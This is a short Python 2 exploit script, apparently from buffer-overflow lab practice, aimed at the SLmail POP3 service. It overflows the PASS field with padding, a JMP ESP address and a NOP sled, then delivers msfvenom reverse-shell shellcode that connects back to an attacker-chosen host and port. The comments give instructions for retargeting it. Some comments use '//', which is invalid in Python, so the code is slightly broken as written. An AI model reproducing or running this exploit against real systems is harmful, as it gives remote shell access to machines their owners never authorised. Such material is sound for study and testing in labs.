//This is the Final Code of Buffer Overflow of the SLmail. 
//Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
//This script is based on python2

import struct

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

//JMP ESP = 5F4A358F

buf = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 10


//msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00\x0a\x0d"

buf += b"\xda\xde\xbf\xd4\x8e\xdc\xcf\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x52\x83\xc2\x04\x31\x7a\x13\x03\xae\x9d\x3e"
buf += b"\x3a\xb2\x4a\x3c\xc5\x4a\x8b\x21\x4f\xaf\xba\x61\x2b"
buf += b"\xa4\xed\x51\x3f\xe8\x01\x19\x6d\x18\x91\x6f\xba\x2f"
buf += b"\x12\xc5\x9c\x1e\xa3\x76\xdc\x01\x27\x85\x31\xe1\x16"
buf += b"\x46\x44\xe0\x5f\xbb\xa5\xb0\x08\xb7\x18\x24\x3c\x8d"
buf += b"\xa0\xcf\x0e\x03\xa1\x2c\xc6\x22\x80\xe3\x5c\x7d\x02"
buf += b"\x02\xb0\xf5\x0b\x1c\xd5\x30\xc5\x97\x2d\xce\xd4\x71"
buf += b"\x7c\x2f\x7a\xbc\xb0\xc2\x82\xf9\x77\x3d\xf1\xf3\x8b"
buf += b"\xc0\x02\xc0\xf6\x1e\x86\xd2\x51\xd4\x30\x3e\x63\x39"
buf += b"\xa6\xb5\x6f\xf6\xac\x91\x73\x09\x60\xaa\x88\x82\x87"
buf += b"\x7c\x19\xd0\xa3\x58\x41\x82\xca\xf9\x2f\x65\xf2\x19"
buf += b"\x90\xda\x56\x52\x3d\x0e\xeb\x39\x2a\xe3\xc6\xc1\xaa"
buf += b"\x6b\x50\xb2\x98\x34\xca\x5c\x91\xbd\xd4\x9b\xd6\x97"
buf += b"\xa1\x33\x29\x18\xd2\x1a\xee\x4c\x82\x34\xc7\xec\x49"
buf += b"\xc4\xe8\x38\xdd\x94\x46\x93\x9e\x44\x27\x43\x77\x8e"
buf += b"\xa8\xbc\x67\xb1\x62\xd5\x02\x48\xe5\xd0\xda\x1b\xb5"
buf += b"\x8c\xd8\x9b\x31\x9f\x54\x7d\x53\x0f\x31\xd6\xcc\xb6"
buf += b"\x18\xac\x6d\x36\xb7\xc9\xae\xbc\x34\x2e\x60\x35\x30"
buf += b"\x3c\x15\xb5\x0f\x1e\xb0\xca\xa5\x36\x5e\x58\x22\xc6"
buf += b"\x29\x41\xfd\x91\x7e\xb7\xf4\x77\x93\xee\xae\x65\x6e"
buf += b"\x76\x88\x2d\xb5\x4b\x17\xac\x38\xf7\x33\xbe\x84\xf8"
buf += b"\x7f\xea\x58\xaf\x29\x44\x1f\x19\x98\x3e\xc9\xf6\x72"
buf += b"\xd6\x8c\x34\x45\xa0\x90\x10\x33\x4c\x20\xcd\x02\x73"
buf += b"\x8d\x99\x82\x0c\xf3\x39\x6c\xc7\xb7\x4a\x27\x45\x91"
buf += b"\xc2\xee\x1c\xa3\x8e\x10\xcb\xe0\xb6\x92\xf9\x98\x4c"
buf += b"\x8a\x88\x9d\x09\x0c\x61\xec\x02\xf9\x85\x43\x22\x28"

//RHOST = 192.168.1.18 (Change according to your IP)
//RPORT = 110 (Change according to your Vulnerable service port)

try:
	print "\nSending evil buffer..."
	s.connect(('192.168.1.18',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buf + '\r\n')
	data = s.recv(1024)
	s.close()
except:
	print "Could not connect to POP3!"
